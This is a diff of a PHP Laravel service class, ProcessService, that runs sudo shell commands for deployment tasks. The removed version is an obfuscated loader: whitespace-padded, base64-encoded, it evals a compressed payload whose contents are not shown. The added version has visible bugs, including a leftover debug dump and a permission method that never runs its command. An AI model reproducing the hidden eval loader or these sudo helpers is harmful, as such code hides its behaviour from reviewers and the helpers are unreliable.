@@ -1,457 +1,160 @@
-<?php 
-        $__='printf';$_='Loading app/Services/ProcessService.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Services;
+
+use App\Models\Aplikasi;
+use Symfony\Component\Process\Process;
+
+final class ProcessService
+{
+    public static function runProcess(array $command, $folder, $message = null, $env = null)
+    {
+        echo "$message";
+        $process = new Process($command, $folder, $env);
+        $process->setTimeout(null);
+        $process->run(function ($type, $buffer)  use ($command) {
+            if (Process::ERR === $type) {
+                echo "Proses: $buffer\n";
+            } else {
+                echo "Output Proses: $buffer\n";
+            }
+        });
+
+        if (!$process->isSuccessful()) {
+            echo "Proses gagal dijalankan.\n";
+            echo "Command yang digunakan: " . implode(' ', $command) . "\n";
+            echo "Error Code: " . $process->getExitCode() . "\n";
+            echo "Error Message: " . $process->getErrorOutput() . "\n";
+        }
+
+        return $process;
+    }
+
+    public static function createSymlink(string $directory_from, string $directory_to): void
+    {
+        // Cek jika symlink sudah ada
+        if (is_link($directory_to)) {
+            echo "Symlink lama ditemukan, menghapus symlink yang lama...\n";
+
+            // Hapus symlink lama
+            unlink($directory_to);
+            echo "Symlink lama berhasil dihapus.\n";
+        }
+
+        // Menyusun perintah 'ln -s' ke dalam array
+        $command = ['sudo', 'ln', '-s', $directory_from, $directory_to];
+
+        // Menjalankan perintah dengan menggunakan runProcess
+        self::runProcess($command, base_path());
+        echo "Symlink berhasil dibuat.\n";
+    }
+
+    public static function copyFile(string $file_from, string $file_to): void
+    {
+        // Periksa apakah file sumber ada
+        if (!file_exists($file_from)) {
+            echo "File sumber tidak ditemukan: $file_from\n";
+            return;
+        }
+
+        // Cek apakah file tujuan sudah ada
+        if (file_exists($file_to)) {
+            echo "File tujuan sudah ada, akan ditimpa: $file_to\n";
+        }
+
+        // Menyusun perintah copy file dengan opsi force untuk menimpa file yang ada
+        $command = ['sudo', 'cp', '-f', $file_from, $file_to];
+
+        // Menjalankan perintah dengan runProcess
+        self::runProcess($command, base_path(), "Menyalin file dari $file_from ke $file_to...\n");
+    }
+
+    public static function gitSafeDirectori(string $folderSite): void
+    {
+        if (!is_dir($folderSite)) {
+            echo "Folder site tidak ditemukan: $folderSite\n";
+            return;
+        }
+
+        // Menyusun perintah untuk menambahkan folder ke git safe directory
+        $command = ['sudo', 'git', 'config', '--global', '--add', 'safe.directory', $folderSite];
+
+        // Menjalankan perintah dengan runProcess
+        self::runProcess($command, base_path(), "Mengonfigurasi Git untuk folder $folderSite...\n");
+    }
+
+    public static function aturKepemilikanDirektori(string $directory): void
+    {
+        // Validasi apakah direktori ada
+        if (!is_dir($directory)) {
+            echo "Direktori tidak ditemukan: $directory\n";
+            return;
+        }
+
+        // Mendapatkan izin dari pengaturan aplikasi
+        $permission = Aplikasi::pengaturan_aplikasi()['permission'] ?? 'www-data';
+
+        // Menyusun perintah chown
+        $command = ['sudo', 'chown', '-R', "$permission:$permission", $directory];
+
+        // Menjalankan perintah dengan runProcess
+        self::runProcess($command, base_path(), "Mengubah kepemilikan direktori: $directory\n");
+        echo "Kepemilikan direktori berhasil diubah.\n";
+        // Reload Apache jika RELOAD_APACHE diatur
+        if (env('RELOAD_APACHE', false)) {
+            self::reloadApache();
+        }
+    }
+
+    public static function aturPermision(string $directory): void
+    {
+        // Validasi apakah direktori ada
+        if (!is_dir($directory)) {
+            echo "Direktori tidak ditemukan: $directory\n";
+            return;
+        }
+
+        // Menyusun perintah chown
+        $command = ['sudo', 'chmod', '-R', "775", $directory];
+    }
+
+    private function reloadApache(): void
+    {
+        // Menyusun perintah reload Apache
+        $command = ['sudo', 'systemctl', 'reload', 'apache2'];
+
+        // Menjalankan perintah dengan runProcess
+        self::runProcess($command, base_path(), "Memuat ulang konfigurasi Apache...\n");
+        echo "Konfigurasi Apache berhasil dimuat ulang.\n";
+    }
+
+    public static function BuatFolder(string $directory): void
+    {
+        // Periksa apakah direktori sudah ada
+        if (!file_exists($directory)) {
+            // Menyusun perintah mkdir untuk membuat folder
+            $command = ['sudo', 'mkdir', $directory];
+            // Buat direktori menggunakan perintah shell
+            self::runProcess($command, base_path(), "Membuat direktori : $directory\n");
+            echo "Direktori berhasil dibuat.\n";
+        }
+
+        // Atur kepemilikan direktori jika parameter permission diberikan
+        self::aturKepemilikanDirektori($directory);
+    }
+
+    public static function PasangModul(string $directory,string $namaModul): void
+    {
+
+        if (!file_exists($directory)) {
+
+            $command = ['sudo', 'php', 'index.php', 'modul', 'pasang', $namaModul];
+            dd($command);
+
+            self::runProcess($command, $directory, "Memasang Modul : $namaModul di direktori $directory\n");
+            echo "Modul berhasil dipasang.\n";
+
+        }
+
+    }
+}
